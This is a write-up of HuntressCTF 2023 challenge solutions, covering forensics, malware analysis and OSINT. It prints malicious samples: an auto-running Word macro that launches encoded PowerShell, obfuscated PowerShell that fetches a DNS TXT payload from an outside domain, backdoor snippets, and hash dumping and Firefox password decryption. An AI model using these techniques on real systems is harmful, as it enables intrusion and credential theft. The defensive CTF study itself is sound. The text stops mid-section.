Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.

- [[Warmups] F12 (Easy)](#f12)
- [[Warmups] String Cheese (Easy)](#string-cheese)
- [[Warmups] Layered Security (Easy)](#layered-security)
- [[Warmups] Comprezz (Easy)](#comprezz)
- [[Warmups] Chicken Wings (Easy)](#chicken-wings)
- [[Forensics] Opposable Thumbs (Easy)](#opposable-thumbs)
- [[Forensics] Dumpster Fire (Easy)](#dumpster-fire)
- [[Forensics] Wimble (Easy)](#wimble)
- [[Forensics] Traffic (Medium)](#traffic)
- [[Forensics] Rogue Inbox (Medium)](#rogue-inbox)
- [[Forensics] Backdoored Splunk (Medium)](#backdoored-splunk)
- [[Forensics] Bad Memory (Medium)](#bad-memory)
- [[Forensics] Tragedy (Medium)](#tragedy)
- [[Forensics] Texas Chainsaw Massacre: Tokyo Drift (Hard)](#texas-chainsaw-massacre-tokyo-drift)
- [[Malware] HumanTwo (Easy)](#humantwo)
- [[Malware] BlackCat (Easy)](#blackcat)
- [[Malware] PHP Stager (Easy)](#php-stager)
- [[Malware] VeeBeeEee (Easy)](#veebeeeee)
- [[Malware] OpenDir (Easy)](#opendir)
- [[Malware] Operation Eradication (Easy)](#operation-eradication)
- [[OSINT] Under The Bridge (Medium)](#under-the-bridge)
- [[OSINT] Operation Not Found (Medium)](#operation-not-found)
- [[OSINT] Where am I? (Medium)](#where-am-i)
- [[M365] General Info (Easy)](#m365-general-info)
- [[M365] Conditional Access (Easy)](#m365-conditional-access)
- [[M365] Teams (Easy)](#m365-teams)
- [[M365] The President (Easy)](#m365-the-president)
- [[Misc] PRESS PLAY ON TAPE (Easy)](#press-play-on-tape)
- [[Misc] Welcome to the Park (Easy)](#welcome-to-the-park)
- [[Stego] Land Before Time (Easy)](#land-before-time)

## F12
During this challenge we are presented with a website that has a button with the text "Capture The Flag" and, when clicked, opens a popup for a split second. The actual code behind the button is:

```
<script type="text/javascript">
    function ctf() {
        window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
    }
</script>
```

To solve this I navigated manually to the `capture_the_flag.html` file on the webserver which contained the flag hidden from display by CSS inside of a `<span>` element:

```
<span style="display:none">
    flag{03e8ba07d1584c17e69ac95c341a2569}
</span>
```

## String Cheese
This challenge downloaded just a 612x408px JPEG picture of string cheese with one of the string cheeses split apart at the end. It still had EXIF data from iStockPhoto, but this wasn't where the flag was. Still thank you to Diana Taliun for the cheese photo! I did find the flag by running `strings` against it however:

```
$ strings cheese.jpg  | grep flag
flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
```

## Layered Security
This challenge presented me with a file called `layered_security` with no extension, so I ran the `file` command on it:

```
$ file layered_security 
layered_security: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
```

I added back the `.xcf` extension and opened it in GIMP. It was a photo with 10 layers of AI-generated faces, and one of them had the flag:

```
flag{9a64bc4a390cb0ce31452820ee562c3f}
```

## Comprezz
This challenge downloaded another extensionless file called `comprezz` and I took some time to figure out what I was working with:

```
$ file comprezz 
comprezz: compress'd data 16 bits
$ hexdump -C comprezz 
00000000  1f 9d 90 66 d8 84 39 b3  27 46 0e 1b 61 6e c4 a0  |...f..9.'F..an..|
00000010  91 03 86 98 1b 62 6a d4  18 43 43 86 18 33 34 68  |.....bj..CC..34h|
00000020  cc 90 71 83 86 99 1c 66  30 5a ec a3 00           |..q....f0Z...|
0000002d
```

This is Unix compression, so I can inflate it like this:

```
$ mv comprezz comprezz.z
$ uncompress comprezz.z
$ cat comprezz
flag{196a71490b7b55c42bf443274f9ff42b}
```

## Chicken Wings
This one was a little confusing at first. It was a file, again with no extension, in UTF-8 encoding that only had emojis in it. I thought it might be a rotational cipher, but it was 57 characters and the flag should be only 38. I then went down a rabbit hole of attempting to figure out how UTF-8 could be used to hide data before I googled the string and found out it was something related to the Wingdings font. There is an online translator that I used to get the flag:

```
Wingdings: ...
Translated: flag{e0791ce68f718188c0378b1c0a3bdc9e}
```

I guess the name was really a hint!

## CaesarMirror
This challenge gave us a file with the following contents:

```
     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj 
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg 
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp 
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret 
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V 
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc 
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf 
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj 
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf 
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf 
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar 
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG 
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug 
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys 
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah 
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp 
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP    
```

I split it into left and right portions using regex. The left portion was ROT-13 encoded, and decoded to this:

```
     Oh boy! Wow, this warmup challenge
    definitely absolutely always love 
       to do with the very basic, common a
     your flag is flag{julius_ and th
 that you will need to solve this
  separate each part of the flag. The
   need just a little bit more. What ex
     this filler text look more enga
    Should we add spaces and try and m
 to make this filler text look bel
 simple, monospace-font text file l
   end? It looks like it! I hope it is good
and at this point you should have ever
    points. The beginning is marked with 
  and it includes English words separat
  brace. Wow! Now THAT is a CTF! Who 
            extent?? So
```

Whereas the right portion was encoded the same way and decoded to this:

```
    Caesar guy a medal!   
 could milk the caesar cipher to this   
 underscores, to end in a closing curly   
 flag prefix and the opening curly brace,   
 that you need to submit this flag for   
 The third part of your flag is reflection}   
 enough to me. Are we almost at the   
 solid square of letters within a    
 symmetrical? How many lines is enough   
 worthwhile? Should we add newlines?   
 should we include here to try and make   
 part of the flag is in_a_ but you do   
 I don't like trying to hide and    
 great start but it is not everything   
 classic CTF techniques! The first part of   
 to think up new and innovative things   
 was a lot of fun to put together! I so  
```

This gives us the final flag (you need to read the paragraphs as they give you explicit instructions on how to construct the flag):

```
flag{julius_in_a_reflection}
```

## Book By Its Cover
This is just a file with the wrong extension. The file header indicates it is a PNG, and opening it as a PNG revealed the flag:

```
flag{f8d32a346745a6c4bf4e9504ba5308f0}
```

## BaseFFFF+1
This challenge, as the title suggests, was in [base65536](https://github.com/qntm/base65536). I decoded it with an online decoder to get the flag:

```
flag{716abce880f09b7cdc7938eddf273648}
```

## Baking
This was a live web instance challenge. It was basically an oven with buttons on some things you could cook such as brownies and muffins. Each item had a specific amount of time it would take which would trigger a counter, but the "Magic Cookies" which I assumed contained the flag were set to 7200 minutes.

Taking the hint, I looked at the cookies for the website:

```
in_oven eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzI3LzIwMjMsIDAxOjU1OjA3In0=
```

This decoded to:

```
{"recipe": "Magic Cookies", "time": "10/27/2023, 01:55:07"}
```

I simply changed it to be way ahead of done, re-encoded it, and overwrote my cookie, and when I refreshed the page my flag was printed!

## Dialtone
This was a challenge that had to do with DTMF tones that phones use. I found an online tool to extract the digits from DTMF recordings online and got this number:

```
13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
```

Then I converted this large number back to bytes using a Python interpreter:

```
>>> bigint = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
>>> bytearray.fromhex('{:0192x}'.format(bigint))
bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag{6c733ef09bc4f2a4313ff63087e25d67}')
```

## Opposable Thumbs
This challenge just presented as a `thumbcache.db` file. This file is found on Windows systems, and is used as a cache to store thumbnails for files when they are viewed using Explorer. The flag was just displayed on one of these cached thumbnailes. I used Thumbcache Viewer to extract them.

```
flag{human_after_all}
```

## Dumpster Fire
This was just a tar archive of a filesystem from a Linux system. The challenge prompt hinted towards foxes and I could tell Firefox was installed on the system so I assumed it would be in one of Firefox's SQLite databases. These are located in the Firefox profiles and on Linux are usually located in a user's home directory. In this case they were under:

```
/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
```

For this challenge I used a software called DB Browser for SQLite. I saw that there was browsing history for a site `http://localhost:31337`. Firefox stores login credentials in a file called `logins.json`, and encrypts them with material from another file `key4.db`. In the `logins.json` file there was indeed an entry for this website, so I extracted the password using [firefox_decrypt](https://github.com/unode/firefox_decrypt).

In this case, the password was the flag.

```
$ python3 firefox_decrypt.py bc1m1zlr.default-release/
2023-10-25 20:00:24,530 - WARNING - profile.ini not found in bc1m1zlr.default-release/
2023-10-25 20:00:24,530 - WARNING - Continuing and assuming 'bc1m1zlr.default-release/' is a profile location

Website:   http://localhost:31337
Username: 'flag'
Password: 'flag{35446041dc161cf5c9c325a3d28af3e3}'
```

## Wimble
This challenge downloaded a 7z archive, and when inflated produced a `.wim` file. 

```
$ file fetch 
fetch: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup
```

I didn't know what this extension was, but when I added it back to the file it behaved like an archive. Inside were a lot of prefetch files. In short, prefetch stores what files/libraries a program accesses in the first 10 seconds that it runs. I used a tool called PECmd by Eric Zimmerman to parse all of them:

```
PECmd.exe -d prefetch_files > parser_output.txt 
```

One of the files referenced was the flag:

```
61: \VOLUME{01d89fa75d2a9f57-245d3454}\USERS\LOCAL_ADMIN\DESKTOP\FLAG{97F33C9783C21DF85D79D613B0B258BD}
```

## Traffic
I spent some time looking through the logs and collecting some baseline information for these exports. Some notes:

- From the `conn.*.log` files, there are two DNS servers being used, `1.1.1.1` and `1.0.0.1`
- There is one internal host seen at `10.24.0.2`
- The following HTTP User-Agents are seen from this host (Sourced from the `http.*.log` files:
  - `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36`
  - `Microsoft-CryptoAPI/10.0`
  - `MICROSOFT_DEVICE_METADATA_RETRIEVAL_CLIENT`

The first place I wanted to look at were the DNS logs. After all, if the user connected to a suspected malicious site, the site must have been queried. I started filtering it down, removing some TLDs such as `.edu`, `.gov` to reduce noise. I found the following suspect entry:

```
1.1.1.1	53	udp	9027	0.043605	sketchysite.github.io
```

The domain `sketchysite.github.io` resolved to the following addresses:
- `185.199.108.153`
- `185.199.109.153`
- `185.199.110.153`
- `185.199.111.153`

I visited this site and it had the flag listed:

```
flag{}
```

## Rogue Inbox 
The challenge states that the user DebraB has potentially been compromised. From the provided M365 logs, it seems this user's E-mail address is ```DebraB@M365B132131.OnMicrosoft.com```.

After some preliminary log analysis, I came up with the following timeline of interesting events tied to the account:

```
9/26/2023 1:52 DebraB login from 185.73.124.135
9/26/2023 1:56 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 1:56 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "l"}]
9/26/2023 1:57 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "a"}]
9/26/2023 1:57 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "g"}]
9/26/2023 1:58 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "{"}]
9/26/2023 1:58 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 1:59 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
9/26/2023 1:59 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "c"}]
9/26/2023 2:00 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
9/26/2023 2:00 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 2:01 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "3"}]
9/26/2023 2:01 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "a"}]
9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "d"}]
9/26/2023 2:03 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "e"}]
9/26/2023 2:03 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "e"}]
9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "3"}]
9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "9"}]
9/26/2023 2:05 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 2:05 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "b"}]
9/26/2023 2:06 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
9/26/2023 2:06 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "c"}]
9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "8"}]
9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "5"}]
9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
9/26/2023 2:08 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:08 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "7"}]
9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "b"}]
9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "6"}]
9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "}"}]
```

The `New-Inbox` operations are one of the first things I look for from prior experience working on business email compromise incidents. I just used Excel to analyze these logs, and filtered for the suspected compromised account and for the operation `New-Inbox`. Normally an attacker does not create this many rules, but extracting the rule names gives us the flag:

```
flag{24c4230fa7d50eef392b2c850f74b0f6}
```

## Backdoored Splunk
This is an instance-based challenge. When I connect to the instance I get the following error:

```
$ curl -i http://chal.ctf.games:30866/
HTTP/1.1 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 52

{"error":"Missing or invalid Authorization header"}
```

At this point I assumed that to get the flag it was necessary to authorize ourselves. The challenge file is a copy of a Splunk Add-on for Windows directory, for version `8.7.0`. I didn't know much about this so I took a look at the [documentation](https://docs.splunk.com/Documentation/AddOns/released/Windows/AbouttheSplunkAdd-onforWindows), which didn't reveal much.

Looking at the files, I noticed most of them were created on `5/10/2023`, but there was a directory of PowerShell scripts that was created on `9/19/2023`. I started to look for any credentials that may have been included in these scripts and found this in the file `nt6-health.ps1`:

```
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```

So I passed this over to the instance:

```
$ curl -i http://chal.ctf.games:30866/ -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69

<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->
```

Then decoded the returned Base64:

```
$ echo "ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==" | base64 -d
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```

## Bad Memory
This was a memory forensics challenge, so I enlisted the help of volatility. The decompressed file was 4GB.

I wasn't sure what password was being requested. I went ahead assuming it was the user profile's password for their user account.

Initially I tried to see if there was anything in the password reminder questions, located in `SAM\Domains\Account\Users\000003E9` but this didn't turn up any results as they were filled with nonsense answers.

Next, I dumped the user account hashes:

```
python vol.py -f image.bin windows.hashdump
Volatility 3 Framework 2.5.2
User	rid		lmhash								nthash
congo	1001	aad3b435b51404eeaad3b435b51404ee	ab395607d3779239b83eed9906b4fb92
```

I ran the nthash through crackstation and got a match for the password `goldfish#`. All that was left was to get the MD5 hash:

```
$ echo -n 'goldfish#' | md5sum
2eb53da441962150ae7d3840444dfdde  -
```

Therefore, the flag is `flag{2eb53da441962150ae7d3840444dfdde}`.

## Tragedy
This file appeared to be a ZIP archive:

```
$ file tragedy_redux 
tragedy_redux: Zip archive data
```

But upon closer inspection, it had the following contents:

```
_rels
word
docProps
[Content_Types].xml
```

This indicates that it is actually a Microsoft Word file. These aren't really files per se, but ZIP archives. Regardless, inside the archive we see evidence that it contains an embedded VBA macro, such as a file named `vbaProject.bin`. I extracted this file as it is a compiled VBA resource. The tool I chose to attempt to decompile it was `oletools`:

```
python oletools\olevba.py ..\tragedy_redux\vbaProject.bin
```

Which produced the following output:

```
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    
    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

I wanted this in something that I can actually interpret and play around with (I am clueless when it comes to VBA) so I converted it to Python and printed some of the more interesting variables I wanted to track: 

```
def pears(beets):
    return chr(int(beets) - 17)

def strawberries(grapes):
    return grapes[:3]

def almonds(jelly):
    return jelly[3:]

def nuts(milk):
    oat_milk = ""
    while len(milk) > 0:
        oat_milk += pears(strawberries(milk))
        milk = almonds(milk)
    return oat_milk

def bears(cows):
    return cows[::-1]

def tragedy():
    apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    print("If ActiveDocument.Name <> " + nuts("131134127127118131063117128116"))
    water = nuts(apples)
    print(water)

tragedy()
```

This results in the following:

```
If ActiveDocument.Name <> runner.doc
powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==
```

So it seems that the macro checks if the document is named `runner.doc`, and if so proceeds to executed an encoded powershell command. Powershell uses Base64 for its default encoding, and throwing this into CyberChef gives us the flag:

```
$flag="flag{63dcc82c30197768f4d458da12f618bc}"
```

## Texas Chainsaw Massacre Tokyo Drift
In this challenge, we are presented with an event log and told that a "rogue process" was detected on the endpoint when the user attempted to install a video game called "Texas Chainsaw Massacre." Scrolling through the event log I saw this interesting potentially related event:

```
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="MsiInstaller" /> 
  <EventID Qualifiers="0">1337</EventID> 
  <Version>0</Version> 
  <Level>4</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2023-10-10T16:02:47.088023300Z" /> 
  <EventRecordID>1785</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="9488" ThreadID="0" /> 
  <Channel>Application</Channel> 
  <Computer>DESKTOP-JU2PNRI</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data>Windows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.</Data> 
  <Binary>2828272E2028205...</Binary> 
  </EventData>
  </Event>
```

I've truncated the `<Binary>` XML element because it was rather large, but I threw it into CyberChef and got the following:

```
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

This looks like obfuscated powershell based on the presence of some noticable strings such as `CoMSpEc`, `vERboSEpreFeRenCe`, or `[rEGeX]::mAtcheS`. I used a tool called [PowerDecode](https://github.com/Malandrone/PowerDecode) to attempt to deobfuscate it and got the following script:

```
try {
    $TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue'; 
    if ($error.Count -eq 0) { 
        $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); 
        if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { 
            [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Write-Host 
        } 
    } 
    } catch { }
```

It did an amazing job, right? Anyway, it looks to be querying a TXT DNS record from the domain `eventlog.zip` (yes, .zip is now a valid TLD!). I ran a dig query to see what was there:

```
$ dig -t TXT eventlog.zip

; <<>> DiG 9.18.12-0ubuntu0.22.04.3-Ubuntu <<>> -t TXT eventlog.zip
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9491
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;eventlog.zip.			IN	TXT

;; ANSWER SECTION:
eventlog.zip.		3600	IN	TXT	"U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg=="
```

The Base64-encoded TXT record returns:

```
Start-Process "https://youtu.be/561nnd9Ebss?t=16"
#flag{409537347c2fae01ef9826c2506ac660}#
```

## HumanTwo
This was a large collection of `human2.aspx` backdoors from the MOVEIt incident. I ran a diff on a few of them and the only lines that differed were in the `Page_load()` function on line 36. For example:

```
if (!String.Equals(pass, "24068cbf-de5f-4cd2-9ad6-ba7cdb7bbfa9"))
if (!String.Equals(pass, "3b321587-d075-4221-9628-b6c8959841df"))
```

So I dumped all of these lines and found one that was far different from the rest: 

```
if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))
```

The UUIDs here are actually ASCII encoded as hexadecimal. The flag after converting it is:

```
flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}
```

## Snake Eater


## BlackCat
This was the first reverse engineering/malware challenge of the CTF. It is a ransomware sample with a few files that were encrypted by it. The ransom note states that it uses "military-grade encryption." Taking a look at the samples of encrypted files, the entropy looked too low to be something like AES so I knew right away something was up.

I started messing around with inserting different keys into the program. It seems that the minimum length of the key is 8 characters, anything less and it complains that the key is too small and refuses to decrypt the files.

After some more testing, I noticed it seems to have something to do with XOR. Look at what happens when we use the key `ABCDEFGH`.

```
Encrypted:
00000000  28 0A 16 1D 06 0C 08 49 0E 16 53 0B 03 03 08 49  |(......I..S....I|
00000010  0B 0A 01 08 4F 11 00 49 0A 1B 54 1E 4F 11 0E 0F  |....O..I..T.O...|
00000020  06 4E 79 67 09 0E 0E 0E 18 5F 4A 5F 58 56 5B 0B  |.Nyg....._J_XV[.|
00000030  56 5A 47 5F 5F 52 5C 5A 00 5A 16 0F 56 06 59 59  |VZG__R\Z.Z..V.YY|
00000040  5A 0A 12 0E 5A 07 57 5B 50 12                    |Z...Z.W[P.|

Decrypted:
00000000  69 48 55 59 43 4A 4F 01 4F 54 10 4F 46 45 4F 01  |iHUYCJO.OT.OFEO.|
00000010  4A 48 42 4C 0A 57 47 01 4B 59 17 5A 0A 57 49 47  |JHBL.WG.KY.Z.WIG|
00000020  47 0C 3A 23 4C 48 49 46 59 1D 09 1B 1D 10 1C 43  |G.:#LHIFY......C|
00000030  17 18 04 1B 1A 14 1B 12 41 18 55 4B 13 40 1E 11  |........A.UK.@..|
